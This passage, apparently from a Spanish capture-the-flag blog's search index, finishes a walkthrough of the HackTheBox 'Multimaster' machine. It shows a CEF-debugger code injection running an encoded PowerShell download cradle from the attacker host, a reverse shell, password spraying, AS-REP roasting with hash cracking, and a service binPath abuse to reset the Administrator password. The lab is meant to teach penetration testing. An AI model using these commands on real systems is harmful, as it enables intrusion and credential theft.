0:80/) . . . 10. 10. 10. 179 - - [02/Apr/2023 16:23:11]  GET /PS. ps1 HTTP/1. 1  200 -*Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; . \ceffdebug. execeffdebug. exe : [2023/04/02 09:28:38:6062] U: There are 3 tcp sockets in state listen.   + CategoryInfo     : NotSpecified: ([2023/04/02 09:. . . n state listen. :String) [], RemoteException  + FullyQualifiedErrorId : NativeCommandError[2023/04/02 09:28:58:6598] U: There were 1 servers that appear to be CEF debuggers. [2023/04/02 09:28:58:6618] U: ws://127. 0. 0. 1:16034/d18406c9-66d7-41ff-946f-3f2a9b0eabfe*Evil-WinRM* PS C:\WIndows\Temp\Priv&gt; . \ceffdebug. exe --url ws://127. 0. 0. 1:16034/d18406c9-66d7-41ff-946f-3f2a9b0eabfe --code  process. mainModule. require('child_process'). exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBQAFMALgBwAHMAMQAnACkA') ceffdebug. exe : [2023/04/02 09:30:09:1259] U: &gt;&gt;&gt; process. mainModule. require('child_process'). exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBQAFMALgBwA. . .   + CategoryInfo     : NotSpecified: ([2023/04/02 09:. . . wBQAFMALgBwA. . . :String) [], RemoteException  + FullyQualifiedErrorId : NativeCommandError[2023/04/02 09:30:09:1269] U: &lt;&lt;&lt; ChildProcessy recimos una consola como el usuario cyork ❯ rlwrap ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 179. Ncat: Connection from 10. 10. 10. 179:50183. Windows PowerShell running as user cyork on MULTIMASTERCopyright (C) 2015 Microsoft Corporation. All rights reserved. whoamimegacorp\cyorkListando los grupos del usuario, vemos que pertenece al grupo Developers; este grupo tiene acceso al directorio inetpub\wwwroot Dentro encontramos archivos dll, concretamente un archivo de nombre MultimasterAPI. dll que procederemos a traernos a nuestra maquina. dir  Directory: C:\inetpub\wwwroot\binMode        LastWriteTime     Length Name                                 ----        -------------     ------ ----                                 d-----     1/7/2020  9:28 PM        roslyn                                -a----    2/21/2013  7:13 PM     102912 Antlr3. Runtime. dll                          -a----    2/21/2013  7:13 PM     431616 Antlr3. Runtime. pdb                          -a----    5/24/2018  1:08 AM     40080 Microsoft. CodeDom. Providers. DotNetCompilerPlatform. dll        -a----    7/24/2012 11:18 PM     45416 Microsoft. Web. Infrastructure. dll                   -a----     1/9/2020  4:13 AM     13824 MultimasterAPI. dll                          -a----     1/9/2020  4:13 AM     28160 MultimasterAPI. pdb                          -a----    2/17/2018  8:14 PM     664576 Newtonsoft. Json. dll                          -a----    11/27/2018 11:30 PM     178808 System. Net. Http. Formatting. dll                    -a----    11/27/2018 11:28 PM     27768 System. Web. Cors. dll                          -a----    1/27/2015  2:34 PM     139976 System. Web. Helpers. dll                        -a----    11/27/2018 11:31 PM     39352 System. Web. Http. Cors. dll                       -a----    11/27/2018 11:31 PM     455096 System. Web. Http. dll                          -a----    1/31/2018 10:49 PM     77520 System. Web. Http. WebHost. dll                      -a----    1/27/2015  2:32 PM     566472 System. Web. Mvc. dll                          -a----    2/11/2014  1:56 AM     70864 System. Web. Optimization. dll                      -a----    1/27/2015  2:32 PM     272072 System. Web. Razor. dll                         -a----    1/27/2015  2:34 PM     41672 System. Web. WebPages. Deployment. dll                  -a----    1/27/2015  2:34 PM     211656 System. Web. WebPages. dll                        -a----    1/27/2015  2:34 PM     39624 System. Web. WebPages. Razor. dll                     -a----    7/17/2013  4:33 AM    1276568 WebGrease. dll                             PS C:\inetpub\wwwroot\bin&gt;Vemos la lista de caracteres imprimibles con strings, pero al ser un ejecutable de windows usaremos el parametro -e l para que nos liste mayor informacion. ❯ strings -e l MultimasterAPI. dllFROMWHERELIKEINFORMATION_SCHEMAMASTER{  info  :  MegaCorp API  }application/jsonserver=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;Obtenemos una nueva contraseña y volveremos a validarla con crackmapexec si corrsponde a otro usuario. ❯ crackmapexec smb 10. 10. 10. 179 -u users. txt -p 'D3veL0pM3nT!' --continue-on-successSMB     10. 10. 10. 179  445  MULTIMASTER   [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP. LOCAL) (signing:True) (SMBv1:True)SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\tushikikatomo:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\lana:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [-] MEGACORP. LOCAL\andrew:D3veL0pM3nT! STATUS_LOGON_FAILURE SMB     10. 10. 10. 179  445  MULTIMASTER   [+] MEGACORP. LOCAL\sbauer:D3veL0pM3nT!Con estas nuevas credenciales nos volvemos a conectar con evil-winrm y tendriamos acceso esta vez como sbauer ❯ evil-winrm -i 10. 10. 10. 179 -u 'sbauer' -p 'D3veL0pM3nT!'Evil-WinRM shell v3. 4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github. com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\sbauer\Documents&gt; whoamimegacorp\sbauerSeguidamente subiremos el ejecutable sharphound. exe para recopilar datos de DC que posteriormente con bloodhound interpretaremos. Una vez tengamos el archivo en la maquina victima lo ejecutamos y este nos generara un archivo . zip que abriremos en bloodhound *Evil-WinRM* PS C:\WIndows\Temp\Privesc&gt; . \SharpHound. exe -c All2023-04-02T09:45:51. 8354209-07:00|INFORMATION|This version of SharpHound is compatible with the 4. 2 Release of BloodHound2023-04-02T09:45:51. 9916814-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote*Evil-WinRM* PS C:\WIndows\Temp\Privesc&gt; dir  Directory: C:\WIndows\Temp\PrivescMode        LastWriteTime     Length Name----        -------------     ------ -----a----     4/2/2023  9:47 AM     14062 20230402094551_BloodHound. zip-a----     8/3/2022  9:21 AM    1060864 SharpHound. exe-a----     4/2/2023  9:47 AM     13225 YThiODEyNWUtMTcwMC00YWY2LTgwZmYtNmIxMWU0MTM4ZDg5. binSubimos el . zip a bloodhound marcamos al usuario sbauer como User as owned y en analisys pinchamos en la opcion Shortest Paths form Owned Principals Observamos que el usuario sbauer tiene el privilegio Generic Write sobre el usuario Jorden quien a su vez forma parte del grupo Server Operators  GenericWrite - actualizar los atributos del objeto (por ejemplo, script de inicio de sesión) Aprovecharemos el Generic Write para setear la propiedad dont require Kerberos preauthentication y con esto hacer al usuario ASREPRoasteable *Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; Get-Aduser jorden | Set-ADAccountControl -doesnotrequirepreauth $trueConGetNPUsers. py esta vez si podamos obtener el hash ❯ GetNPUsers. py MEGACORP. LOCAL/ -no-pass -usersfile users. txtImpacket v0. 9. 24 - Copyright 2021 SecureAuth Corporation[-] User tushikikatomo doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User lana doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User andrew doesn't have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$jorden@MEGACORP. LOCAL:8e7ea2a50a1602c925cf681fca176a58$a2a1627ed23fe85bdadc88c1a0b551f0ee10dfe43f7677fc6f1204e36d5e849c95932313e7fae6b9829be5d69f243279f32098db2118abef962bb1b7fa2caafe91ca22d2747690dea014ecc6e9f95e2dffdd8acac823f47c7e29a834cf910daa4cbdc19187bbf95d436e083a050e274fd15905b15f58c2e9cc23932efcac112a2adf3a59fd3de0342d4d35e33f7da5aeb2be18db5aa625a95adbde5c075843711be01945177e8fd7935c8edc5355ee98fce7b9d4becbc72e14606e5c4df3b1577f19b621457089150499cf8a79616110fe973d7e63bbde78641380be90733b621190a13c13968c6ed3d2d9ea85bf9603[-] User sbauer doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User okent doesn't have UF_DONT_REQUIRE_PREAUTH setProcedamos a crackearlo con john y nos devuelve la contraseña en texto claro. ❯ john --wordlist=/usr/share/wordlists/rockyou. txt hashUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusrainforest786  ($krb5asrep$23$jorden@MEGACORP. LOCAL)1g 0:00:00:06 DONE (2023-04-02 17:01) 0. 1550g/s 682666p/s 682666c/s 682666C/s rainian. . railezs05Use the  --show  option to display all of the cracked passwords reliablySession completedNos conectamos nuevamente con evil-winrm y hubieramos migrado al usuario jorden ❯ evil-winrm -i 10. 10. 10. 179 -u 'jorden' -p 'rainforest786'Evil-WinRM shell v3. 4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github. com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\jorden\Documents&gt; whoamimegacorp\jordenAntes vimos que este usuario formaba parte del grupo Server Operators, aprovecharemos esto para cambiar la propiedad binpath de un proceso el cual el forzaremos a desactivarse y al iniciarlo nuevamente nos ejecutara la sentencia que hayamos puesto. Cambiaremos el binPath del proceso browser para que al volver a iniciarse nos cambie la contraseña del usuario Administrator. *Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc. exe config browser binPath= C:\Windows\System32\cmd. exe /c net user Administrator fmiracle123$! [SC] ChangeServiceConfig SUCCESS*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc. exe stop browserSERVICE_NAME: browser    TYPE        : 20 WIN32_SHARE_PROCESS    STATE       : 3 STOP_PENDING                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)    WIN32_EXIT_CODE  : 0 (0x0)    SERVICE_EXIT_CODE : 0 (0x0)    CHECKPOINT     : 0x1    WAIT_HINT     : 0xafc8*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc. exe start browser[SC] StartService FAILED 1053:The service did not respond to the start or control request in a timely fashion. Verificamos y efectivamente cambiamos las claves del usuario Administrator ❯ crackmapexec smb 10. 10. 10. 179 -u 'Administrator' -p 'fmiracle123$!'SMB     10. 10. 10. 179  445  MULTIMASTER   [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP. LOCAL) (signing:True) (SMBv1:True)SMB     10. 10. 10. 179  445  MULTIMASTER   [+] MEGACORP. LOCAL\Administrator:fmiracle123$! (Pwn3d!)Lo siguiente sera conectarnos, ir al directorio personal del usuario y visualizar la segunda flag root. txt ❯ evil-winrm -i 10. 10. 10. 179 -u 'Administrator' -p 'fmiracle123$!'Evil-WinRM shell v3. 4Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github. com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd . . \Desktop*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root. txt559ca9f9c145bc76f8504391a74710ccy listo maquina pwneada!! "
    }];

var idx = lunr(function () {
    this.ref('id')
    this.field('title')
    this.field('body')

    documents.forEach(function (doc) {
        this.add(doc)
    }, this)
});
function lunr_search(term) {
    document.getElementById('lunrsearchresults').innerHTML = '<ul></ul>';
    if(term) {
        document.getElementById('lunrsearchresults').innerHTML = "<p style='color: rgb(57, 16, 87);'>Search results for '" + term + "'</p>" + document.getElementById('lunrsearchresults').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><span class='body'>"+ body +"</span><span class='url'>"+ url +"</span></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult' style='color: rgb(57, 16, 87);'>No he encontrado esa locura, intenta de nuevo :P</li>";
        }
    }
    return false;
}

function lunr_search(term) {
    $('#lunrsearchresults').show( 400 );
    $( "body" ).addClass( "modal-open" );
    
    document.getElementById('lunrsearchresults').innerHTML = '<div id="resultsmodal" class="modal fade show d-block"  tabindex="-1" role="dialog" aria-labelledby="resultsmodal"> <div class="modal-dialog shadow" role="document"> <div class="modal-content"> <div class="modal-header" id="modtit"> <button type="button" class="close" id="btnx" data-dismiss="modal" aria-label="Close"> &times; </button> </div> <div class="modal-body"> <ul class="mb-0" style="list-style-type:none;"> </ul>    </div> <div class="modal-footer"><button id="btnx" type="button" class="btn btn-primary btn-sm" data-dismiss="modal">Close</button></div></div> </div></div>';
    if(term) {
        document.getElementById('modtit').innerHTML = "<h5 class='modal-title' style='color: #1ae2ab;'>Search results for '" + term + "'</h5>" + document.getElementById('modtit').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            //console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><small><span class='body'>"+ body +"</span><span class='url'>"+ url +"</span></small></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult' style='color: #12a6e0;'>No se encontraron resultados...</li>";
        }
    }
    return false;
}
    
$(function() {
    $("#lunrsearchresults").on('click', '#btnx', function () {
        $('#lunrsearchresults').hide( 5 );
        $( "body" ).removeClass( "modal-open" );
    });
});
